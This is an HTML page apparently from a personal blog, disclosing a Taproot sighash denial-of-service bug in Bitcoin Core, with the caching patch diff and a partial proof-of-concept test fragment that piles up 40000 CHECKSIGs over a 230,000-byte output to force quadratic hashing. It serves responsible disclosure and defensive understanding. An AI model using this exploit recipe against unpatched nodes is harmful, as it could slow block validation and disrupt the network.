@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+  <title> Taproot Denial of Service Bug &middot; Jeremy Rubin </title>
+  <link href="https://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/font-awesome-4.5.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
+                                 <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+  
+  <link type="application/atom+xml" rel="alternate" href="http://rubin.io/feed.xml" title="Jeremy Rubin" />
+
+
+  <!-- GA -->
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-40376251-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+  
+  <link rel="me" href="https://twitter.com/JeremyRubin" >
+  <meta name="twitter:dnt" content="on">
+			   <script>window.twttr = (function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0],
+    t = window.twttr || {};
+  if (d.getElementById(id)) return t;
+  js = d.createElement(s);
+  js.id = id;
+  js.src = "https://platform.twitter.com/widgets.js";
+  fjs.parentNode.insertBefore(js, fjs);
+
+  t._e = [];
+  t.ready = function(f) {
+    t._e.push(f);
+  };
+
+  return t;
+}(document, "script", "twitter-wjs"));</script>
+
+</head>
+
+    <body>
+        <div class="sidebar">
+    <h3 style="text-align: center;"> <a href="/"> Jeremy Rubin </a> </h3>
+    <div class="container">
+        <div class="sidebar-about">
+
+            <div class="sidebar-about-info"> 
+                <a href="/public/pdfs/resume.pdf"><i class="fa fa-file-text-o" title=Resume></i></a>
+                <a href=""><i class="fa fa-github" title=Github></i></a>
+                <a href="https://twitter.com/JeremyRubin"><i class="fa fa-twitter" title=Twitter></i></a>
+            </div>
+            <div class="sidebar-about-info hide-large">
+                <a class="" href="/">Home</a>
+                <a class="" href="/blog/">Blog</a>
+                <a class="" href="/talks/">Talks</a> 
+                <a class="" href="/projects/">Projects</a>
+                <a class="" href="/archive/">Site Index</a>
+            </div>
+        </div>
+
+
+
+
+        <nav class="sidebar-nav hide-small">
+            <a class="sidebar-nav-item" href="/">Home</a>
+            <a class="sidebar-nav-item" href="/blog/">Blog</a>
+            <a class="sidebar-nav-item" href="/talks/">Talks</a> 
+            <a class="sidebar-nav-item" href="/projects/">Projects</a>
+            <a class="sidebar-nav-item" href="/archive/">Site Index</a>
+        </nav>
+    </div>
+</div>
+
+
+
+        <div class="content container" style="padding-bottom:0;">
+            <div class="post">
+    <h1 class="post-title">Taproot Denial of Service Bug</h1>
+    
+    
+
+<a class="twitter-share-button"
+data-size="large"
+href="https://twitter.com/intent/tweet?text=Taproot+Denial+of+Service+Bug&hashtags="> Tweet</a>
+
+
+
+    <div>
+        <span class="post-date">11 Mar 2025
+        </span>
+    </div>
+    <p>TL;DR: Taproot’s sighash implementation could cause blocks to take 60s or more to validate with specially crafted standard transactions. The patch adds a new cache during validation.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>patch:</td>
+      <td>https://github.com/bitcoin/bitcoin/pull/24105</td>
+    </tr>
+    <tr>
+      <td>Patched:</td>
+      <td>24.x, 23.x.</td>
+    </tr>
+    <tr>
+      <td>Unpatched:</td>
+      <td>22.x</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>I discovered this vulnerability while addressing feedback on BIP-119 (CTV) regarding its denial of service risk mitigations.</p>
+
+<p>During the comparison of BIPs’ text on DoS mitigations, I identified this vulnerability in the core’s Taproot implementation, made a proof of concept exploit, and patched it.</p>
+
+<p>Special thanks to the reviewers and security maintainers of Bitcoin Core for assisting in resolving this issue.</p>
+
+<h1 id="exploit-explanation--fix">Exploit Explanation &amp; Fix</h1>
+
+<p>The below code fragment is the core of the fix.</p>
+
+<p>Before the patch, the <code class="language-plaintext highlighter-rouge">sha_single_output</code> is computed on the fly during script evaluation, potentially. Because it is not cached, it could potentially get re-hashed multiple times.</p>
+
+<p>After the patch, it is cached after the first evaluation (Cache on First Use).</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/script/interpreter.cpp b/src/script/interpreter.cpp
+index 95ffe40a74..07b44971b7 100644
+</span><span class="gd">--- a/src/script/interpreter.cpp
+</span><span class="gi">+++ b/src/script/interpreter.cpp
+</span><span class="p">@@ -1568,9 +1568,12 @@</span> bool SignatureHashSchnorr(uint256&amp; hash_out, const ScriptExecutionData&amp; execdata
+     // Data about the output (if only one).
+     if (output_type == SIGHASH_SINGLE) {
+         if (in_pos &gt;= tx_to.vout.size()) return false;
+<span class="gd">-        CHashWriter sha_single_output(SER_GETHASH, 0);
+-        sha_single_output &lt;&lt; tx_to.vout[in_pos];
+-        ss &lt;&lt; sha_single_output.GetSHA256();
+</span><span class="gi">+        if (!execdata.m_output_hash) {
++            CHashWriter sha_single_output(SER_GETHASH, 0);
++            sha_single_output &lt;&lt; tx_to.vout[in_pos];
++            execdata.m_output_hash = sha_single_output.GetSHA256();
++        }
++        ss &lt;&lt; execdata.m_output_hash.value();
+</span>     }
+</code></pre></div></div>
+
+<p>What could go wrong? Well, suppose I have a transaction that calls CHECKSIG with SIGHASH_SINGLE N times, and the corresponding SIGHASH_SINGLE output is length M. We can trigger <code class="language-plaintext highlighter-rouge">O(M*N)</code> quadratic hashing.</p>
+
+<p>The below code can be put into the feature_taproot test, along with a few other tweaks, to test this behavior. It makes a script with <code class="language-plaintext highlighter-rouge">40000</code> CHECKSIGS that each have to hash <code class="language-plaintext highlighter-rouge">230,000</code> bytes. I think this was the largest size / repetition count I could figure out, and it took about 60s on an M1 Mac to validate.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">spenders_taproot_active</span><span class="p">():</span>
+    <span class="s">"""Return a list of Spenders for testing post-Taproot activation behavior."""</span>
+    <span class="n">secs</span> <span class="o">=</span> <span class="p">[</span><span class="n">generate_privkey</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
+    <span class="n">pubs</span> <span class="o">=</span> <span class="p">[</span><span class="n">compute_xonly_pubkey</span><span class="p">(</span><span class="n">sec</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">sec</span> <span class="ow">in</span> <span class="n">secs</span><span class="p">]</span>
+
+    <span class="n">spenders</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="c1"># Expensive -- Pile up N CHECKSIGs, minding WU for 
+</span>    <span class="c1"># sigops constraints
+</span>    <span class="n">N</span> <span class="o">=</span> <span class="mi">40000</span>
+    <span class="n">scripts</span> <span class="o">=</span> <span class="p">[(</span><span class="s">"exp"</span><span class="p">,</span> <span class="n">CScript</span><span class="p">([</span><span class="sa">b</span><span class="s">"0"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">OP_DROP</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sa">b</span><span class="s">"0"</span><span class="o">*</span><span class="mi">13</span><span class="p">,</span> <span class="n">OP_DROP</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="mi">11</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">OP_DUP</span><span class="p">,</span> <span class="n">pubs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">OP_CHECKSIGVERIFY</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">pubs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">OP_CHECKSIG</span><span class="p">]))]</span>
+    <span class="n">tap</span> <span class="o">=</span> <span class="n">taproot_construct</span><span class="p">(</span><span class="n">pubs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">scripts</span><span class="p">)</span>
+    <span class="n">add_spender</span><span class="p">(</span><span class="n">spenders</span><span class="p">,</span> <span class="s">"exp"</span><span class="p">,</span> <span class="n">tap</span><span class="o">=</span><span class="n">tap</span><span class="p">,</span> <span class="n">leaf</span><span class="o">=</span><span class="s">"exp"</span><span class="p">,</span> <span class="n">standard</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">hashtype</span><span class="o">=</span><span class="n">SIGHASH_SINGLE</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">secs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">**</span><span class="n">SINGLE_SIG</span><span class="p">,</span> <span class="n">failure</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">spenders</span>
+
+
+<span class="k">def</span> <span class="nf">big_output</span><span class="p">(</span><span class="n">tx</span><span class="p">):</span>
+    <span class="c1"># Add 1 Big Output with 0 bytes
+</span>    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">CTxOut</span><span class="p">())</span>
+    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">nValue</span> <span class="o">=</span> <span class="n">in_value</span>
+    <span class="n">in_value</span> <span class="o">-=</span> <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">nValue</span>
+    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">scriptPubKey</span> <span class="o">=</span> <span class="n">CScript</span><span class="p">([</span><span class="sa">b</span><span class="s">"0"</span><span class="p">]</span><span class="o">*</span><span class="mi">230000</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">tx</span>
+    
+</code></pre></div></div>
+
+<p>There are variants of this attack that can rely on standard transactions as well, but the caching should eliminate all potential concern with SIGHASH_SINGLE.</p>
+
+    <div>
+    <h3>
+        <span style="vertical-align: text-top;">
+    
+
+<a class="twitter-share-button"
+data-size="large"
+href="https://twitter.com/intent/tweet?text=Taproot+Denial+of+Service+Bug&hashtags="> Tweet</a>
+
+
+
+        </span>
+        <span style="vertical-align: super;">
+to continue the conversation...
+        </span>
+    </h3>
+
+    </div>
+</div>
+
+<aside class="related">
+  <h3>You might also enjoy...</h3>
+  <ul class="related-posts">
+    
+      <li>
+        <a href="/bitcoin/2021/12/24/advent-27/">
+          RoadMap or Load o' Crap?
+          <small><time datetime="2021-12-24T00:00:00+00:00">24 Dec 2021</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/bitcoin/2022/04/17/next-steps-bip119/">
+          7 Theses on a next step for BIP-119
+          <small><time datetime="2022-04-17T00:00:00+00:00">17 Apr 2022</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/blog/2021/07/02/covenants/">
+          Templates, Eltoo, and Covenants, Oh My!
+          <small><time datetime="2021-07-02T00:00:00+00:00">02 Jul 2021</time></small>
+        </a>
+      </li>
+    
+  </ul>
+</aside>
+
+        </div>
+        <div class="content container" style="padding-bottom:0;padding-top:0;bottom:0px;">
+            <div class="posts" style="height:14pt;margin-bottom:0;">
+                <div class="post">
+                    <p style="text-align:center;font-size:12pt;">&copy; 2011-2021 Jeremy Rubin. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
